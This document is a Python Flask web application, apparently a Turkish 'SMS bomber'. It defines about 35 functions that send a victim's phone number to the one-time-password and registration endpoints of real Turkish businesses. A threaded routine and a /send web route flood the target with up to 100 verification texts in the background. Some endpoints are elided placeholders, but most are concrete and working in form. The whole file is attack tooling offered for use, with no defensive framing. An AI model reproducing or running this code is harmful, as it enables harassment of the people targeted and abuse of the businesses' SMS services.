from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
import requests
from random import choice, randint
from string import ascii_lowercase
import threading
import time
import concurrent.futures

app = Flask(__name__)
CORS(app)

class SendSms:
    adet = 0
    
    def __init__(self, phone, mail=""):
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for i in range(22)) + "@gmail.com"
        self.adet = 0

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number"
            json = {"countryCode": "90", "phoneNumber": self.phone}
            r = requests.post(url, json=json, timeout=3)
            if r.json().get("processStatus") == "Success":
                self.adet += 1
                return True
        except:
            pass
        return False

    def Wmf(self):
        try:
            url = "https://www.wmf.com.tr/users/register/"
            r = requests.post(url, data={"confirm": "true", "phone": f"0{self.phone}"}, timeout=3)
            if r.status_code == 202:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Bim(self):
        try:
            url = "https://bim.veesk.net/service/v1.0/account/login"
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Englishhome(self):
        try:
            url = "https://www.englishhome.com/api/member/sendOtp"
            r = requests.post(url, json={"Phone": self.phone, "XID": ""}, timeout=3)
            if r.json().get("isError") == False:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Suiste(self):
        try:
            url = "https://suiste.com/api/auth/code"
            r = requests.post(url, data={"gsm": self.phone, "action": "register"}, timeout=3)
            if r.json().get("code") == "common.success":
                self.adet += 1
                return True
        except:
            pass
        return False

    def Evidea(self):
        try:
            url = "https://www.evidea.com/users/register/"
            r = requests.post(url, data={"phone": f"0{self.phone}", "confirm": "true"}, timeout=3)
            if r.status_code == 202:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Koton(self):
        try:
            url = "https://www.koton.com/users/register/"
            r = requests.post(url, data={"phone": f"0{self.phone}", "confirm": "true"}, timeout=3)
            if r.status_code == 202:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Hayatsu(self):
        try:
            url = "https://api.hayatsu.com.tr/api/SignUp/SendOtp"
            r = requests.post(url, data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=3)
            if r.json().get("is_success") == True:
                self.adet += 1
                return True
        except:
            pass
        return False

    def File(self):
        try:
            url = "https://api.filemarket.com.tr/v1/otp/send"
            r = requests.post(url, json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=3)
            if r.json().get("responseType") == "SUCCESS":
                self.adet += 1
                return True
        except:
            pass
        return False

    def Komagene(self):
        try:
            url = "https://gateway.komagene.com.tr/auth/auth/smskodugonder"
            r = requests.post(url, json={"FirmaId": 32, "Telefon": self.phone}, timeout=3)
            if r.json().get("Success") == True:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Dominos(self):
        try:
            url = "https://frontend.dominos.com.tr/api/customer/sendOtpCode"
            r = requests.post(url, json={"mobilePhone": self.phone}, timeout=3)
            if r.json().get("isSuccess") == True:
                self.adet += 1
                return True
        except:
            pass
        return False

    def KofteciYusuf(self):
        try:
            url = "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder"
            r = requests.post(url, json={"FirmaId": 82, "Telefon": self.phone}, timeout=3)
            if r.json().get("Success") == True:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Little(self):
        try:
            url = "https://api.littlecaesars.com.tr/api/web/Member/Register"
            r = requests.post(url, json={"Phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Coffy(self):
        try:
            url = "https://user-api-gw.coffy.com.tr/user/signup"
            r = requests.post(url, json={"gsm": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Jimmykey(self):
        try:
            url = f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}"
            r = requests.post(url, timeout=3)
            if r.json().get("Sonuc") == True:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Ido(self):
        try:
            url = "https://api.ido.com.tr/idows/v2/register"
            r = requests.post(url, json={"mobileNumber": f"0{self.phone}"}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Kigili(self):
        try:
            url = "https://www.kigili.com/users/registration/"
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Sakasu(self):
        try:
            url = "https://www.sakasu.com.tr/app/api_register/step1"
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Happy(self):
        try:
            url = "https://www.happy.com.tr/index.php?route=account/register/verifyPhone"
            r = requests.post(url, data={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Ipragaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com/tr/api/users/registerMessage/"
            r = requests.post(url, json={"phone_country_code": "+90", "phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Alixavien(self):
        try:
            url = "https://www.alixavien.com.tr/api/member/sendOtp"
            r = requests.post(url, json={"Phone": self.phone, "XID": ""}, timeout=3)
            if r.json().get("isError") == False:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Money(self):
        try:
            url = "https://www.money.com.tr/Account/ValidateAndSendOTP"
            r = requests.post(url, data={"phone": f"{self.phone[:3]} {self.phone[3:10]}"}, timeout=3)
            if r.json().get("resultType") == 0:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Porty(self):
        try:
            url = "https://panel.porty.tech/api.php?"
            r = requests.post(url, json={"job": "start_login", "phone": self.phone}, timeout=3)
            if r.json().get("status") == "success":
                self.adet += 1
                return True
        except:
            pass
        return False

    def Trendyol(self):
        try:
            url = "https://api.trendyol.com/..."
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Hepsiburada(self):
        try:
            url = "https://api.hepsiburada.com/..."
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Migros(self):
        try:
            url = "https://api.migros.com.tr/..."
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def A101(self):
        try:
            url = "https://api.a101.com.tr/..."
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Sok(self):
        try:
            url = "https://api.sokmarket.com.tr/..."
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def CarrefourSA(self):
        try:
            url = "https://api.carrefoursa.com.tr/..."
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Akasya(self):
        try:
            url = "https://akasyaapi.poilabs.com/v1/en/sms"
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.json().get("result") == "SMS sended succesfully!":
                self.adet += 1
                return True
        except:
            pass
        return False

    def Akbati(self):
        try:
            url = "https://akbatiapi.poilabs.com/v1/en/sms"
            r = requests.post(url, json={"phone": self.phone}, timeout=3)
            if r.json().get("result") == "SMS sended succesfully!":
                self.adet += 1
                return True
        except:
            pass
        return False

    def Yapp(self):
        try:
            url = "https://yapp.com.tr/api/mobile/v1/register"
            r = requests.post(url, json={"phone_number": self.phone}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def YilmazTicaret(self):
        try:
            url = "https://app.buyursungelsin.com/api/customer/form/checkx"
            data = {"telephone": f"0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}"}
            r = requests.post(url, data=data, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False

    def Beefull(self):
        try:
            url = "https://app.beefull.io/api/inavitas-access-management/sms-login"
            r = requests.post(url, json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}, timeout=3)
            if r.status_code == 200:
                self.adet += 1
                return True
        except:
            pass
        return False


def send_single_sms(phone, method_name):
    """Tek bir SMS gönder"""
    sms = SendSms(phone)
    method = getattr(sms, method_name)
    try:
        return method()
    except:
        return False


def send_sms_bomber(phone, adet, saniye=0):
    """Paralel SMS gönderimi"""
    methods = [method for method in dir(SendSms) if callable(getattr(SendSms, method)) and not method.startswith('__')]
    
    total_sent = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for i in range(min(adet, len(methods) * 3)):
            method_name = methods[i % len(methods)]
            futures.append(executor.submit(send_single_sms, phone, method_name))
            if saniye > 0:
                time.sleep(saniye)
        
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                total_sent += 1
    
    return total_sent


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/send', methods=['POST'])
def send_sms():
    data = request.json
    phone = data.get('phone', '').strip()
    adet = int(data.get('adet', 20))
    saniye = int(data.get('saniye', 0))
    
    if not phone or len(phone) != 10:
        return jsonify({'error': 'Geçerli bir telefon numarası girin (10 haneli, 5 ile başlayan)!'}), 400
    
    if adet > 100:
        adet = 100
    
    try:
        # Arka planda gönder
        def send_thread():
            send_sms_bomber(phone, adet, saniye)
        
        thread = threading.Thread(target=send_thread)
        thread.start()
        
        return jsonify({
            'success': True,
            'message': f'{adet} adet SMS gönderimi başladı!',
            'phone': phone
        })
    except Exception as e:
        return jsonify({'error': str(e)}), 500


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
